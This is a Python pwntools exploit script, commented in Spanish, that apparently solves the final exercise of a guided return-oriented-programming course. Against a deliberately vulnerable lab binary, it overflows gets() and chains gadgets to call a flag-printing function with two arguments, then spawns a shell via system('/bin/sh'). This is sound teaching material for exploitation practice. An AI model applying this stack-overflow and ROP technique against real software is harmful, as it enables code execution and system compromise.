#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""C6 - Integrador: alineacion + DOS argumentos + llamada doble.
UNA sola entrada de gets() debe:
  1) llamar flag_printer(0xcafebabe, 0x8badf00d)  (RDI + RSI),
  2) sobrevivir al movaps de printf (ret de alineacion),
  3) encadenar system("/bin/sh") con gadgets y datos de libc
     (ASLR desactivada + base via setarch -R ldd, como en B2/C2).
Mezcla de fuentes de piezas: gadgets EMBEBIDOS para los argumentos
(fijos por No PIE) y libc para system y "/bin/sh".
USO: python3 c6_final.py"""
from pwn import *
import os
import re
import subprocess
import time

context.arch = 'amd64'
context.log_level = 'info'

BIN = './c6_final'
MAGIC_RDI = 0xcafebabe
MAGIC_RSI = 0x8badf00d

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'c6_final.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

elf = ELF(BIN, checksec=False)

# ------------------------------------------------------------------
# FASE 0 - piezas embebidas (fijas por No PIE) + base de libc (setarch)
# ------------------------------------------------------------------
g_pop_rdi = elf.symbols['g_pop_rdi']
g_pop_rsi = elf.symbols['g_pop_rsi']
g_ret = elf.symbols['g_ret']
flag_printer = elf.symbols['flag_printer']
log.info('g_pop_rdi = %#x | g_pop_rsi = %#x | g_ret = %#x',
         g_pop_rdi, g_pop_rsi, g_ret)

ARCH = os.uname().machine
ldd_out = subprocess.run(
    ['setarch', ARCH, '-R', 'ldd', BIN],
    capture_output=True, text=True).stdout
m = re.search(r'libc\.so\.6 => (\S+) \(0x([0-9a-f]+)\)', ldd_out)
if not m:
    log.failure('ldd no mostro libc; verifica setarch -R y ASLR.')
    raise SystemExit(1)
libc = ELF(m.group(1), checksec=False)
libc.address = int(m.group(2), 16)     # base fija con ASLR fuera
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
log.info('libc base %#x | system = %#x', libc.address, system)

# ------------------------------------------------------------------
# FASE 1 - offset dinamico: patron ciclico + corefile (metodo A2)
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])
io.recvuntil(b'DOS objetivos')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - la cadena integradora, casilla a casilla (9 casillas):
#   [g_pop_rdi][0xcafebabe]      <- RDI = 1er argumento
#   [g_pop_rsi][0x8badf00d]      <- RSI = 2do argumento
#   [g_ret]                      <- alineacion para printf (movaps)
#   [flag_printer]               <- imprime la flag; su ret consume
#   [g_pop_rdi][binsh]              la casilla siguiente...
#   [g_ret]                      <- alineacion para system
#   [system]                     <- shell heredando stdin/stdout
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])
io.recvuntil(b'DOS objetivos')
payload = (b'A' * offset
           + p64(g_pop_rdi)
           + p64(MAGIC_RDI)
           + p64(g_pop_rsi)
           + p64(MAGIC_RSI)
           + p64(g_ret)
           + p64(flag_printer)
           + p64(g_pop_rdi)
           + p64(binsh)
           + p64(g_ret)
           + p64(system))
assert b'\n' not in payload, 'gets() cortaria el payload en el primer 0x0a'
io.sendline(payload)
time.sleep(0.5)
io.sendline(b'echo PWNED_C6_$(id -u); id; exit')
salida = io.recvall(timeout=4)
io.close()

FLAG = b'FLAG{ROP_C6_integrador_doble_llamada}'
if FLAG in salida and b'PWNED_C6' in salida:
    log.success('C6 SUPERADO: flag + shell en una sola entrada. La serie '
                'guiada esta dominada.')
elif FLAG in salida:
    log.failure('C6: flag OK pero el shell no llego: revisa la 2a mitad '
                '(pop rdi de libc/g_embebido, g_ret y base de ldd).')
else:
    log.failure('C6: sin flag. Pistas: RDI antes que RSI, g_ret antes de '
                'flag_printer, base de libc con setarch -R ldd.')
